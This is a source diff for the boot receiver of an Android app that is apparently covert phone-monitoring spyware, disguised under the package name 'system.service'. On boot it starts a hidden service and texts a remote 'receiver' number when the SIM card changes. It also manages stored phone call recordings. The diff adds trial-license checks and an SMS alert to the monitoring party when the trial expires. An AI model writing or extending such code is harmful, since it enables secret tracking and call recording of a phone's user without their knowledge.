@@ -1,6 +1,7 @@
 package system.service.receiver;
 
 import system.service.BootService;
+import system.service.GlobalValues;
 import system.service.R;
 import system.service.R.string;
 import system.service.activity.GlobalPrefActivity;
@@ -13,6 +14,7 @@ import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.location.BaseStationLocation;
 import com.particle.inspector.common.util.location.BaseStationUtil;
+import com.particle.inspector.common.util.license.LicenseCtrl;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -35,17 +37,44 @@ public class BootReceiver extends BroadcastReceiver {
 		
 		if (bootintent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
 		{
+			// ---------------------------------------------------------------------
+			// Calculate license type
+			String key = ConfigCtrl.getLicenseKey(context);
+			GlobalValues.licenseType = LicenseCtrl.calLicenseType(context, key);
+			
+			// ---------------------------------------------------------------------
+			// If license is illegal, do nothing
+			if (!ConfigCtrl.isLegal(context)) 
+			{
+				// If out of trial, send SMS to warn the receiver user
+				if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED)
+				{
+					// If has sent before, DO NOT send again
+					if (ConfigCtrl.getHasSentExpireSms(context)) return;
+					
+					// Send SMS to the receiver that has expired
+					String receiverPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+					if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
+						String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context))
+								+ context.getResources().getString(R.string.support_qq);
+						boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
+						if (ret) {
+							ConfigCtrl.setHasSentExpireSms(context, true);
+						}
+					}
+				}
+				
+				return;
+			}
+			
 			// ==========================================================================
 			// Start service
 			Intent mServiceIntent = new Intent(context, BootService.class);
 			context.startService(mServiceIntent);
 			
-			// ------------------------------------------------------------------
-			// If license is illegal, do not check SIM state
-			if (!ConfigCtrl.isLegal(context)) return;
-			SysUtils.threadSleep(3000, LOGTAG);
-		
+			//===========================================================================
 			// Start to check if changed SIM card
+			SysUtils.threadSleep(2000, LOGTAG);
 			
 			TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 			//int simState = mTelephonyMgr.getSimState();
@@ -77,7 +106,7 @@ public class BootReceiver extends BroadcastReceiver {
 						if (recvPhoneNum != null && recvPhoneNum.length() > 0) 
 						{
 							// If it is in trial, send SMS directly without new SIM phone number
-							if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.TRIAL_LICENSED) {
+							if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
 								String strContent = String.format(context.getResources().getString(R.string.msg_changed_sim), ConfigCtrl.getSelfName(context))
 										+ context.getResources().getString(R.string.msg_changed_sim_new_number_trial);
 								boolean ret = SmsCtrl.sendSms(recvPhoneNum, strContent);
@@ -98,10 +127,10 @@ public class BootReceiver extends BroadcastReceiver {
 			}
 			
 			// ==========================================================================
-			// Start a new thread to clear redundant phone call recordings
 			this.context = context;
 			new Thread(new Runnable(){
 				public void run() {
+					// Start a new thread to clear redundant phone call recordings
 					FileCtrl.reduceWavFiles(BootReceiver.this.context, WAV_FILE_MAX_NUM);
 				}
 			}).start();
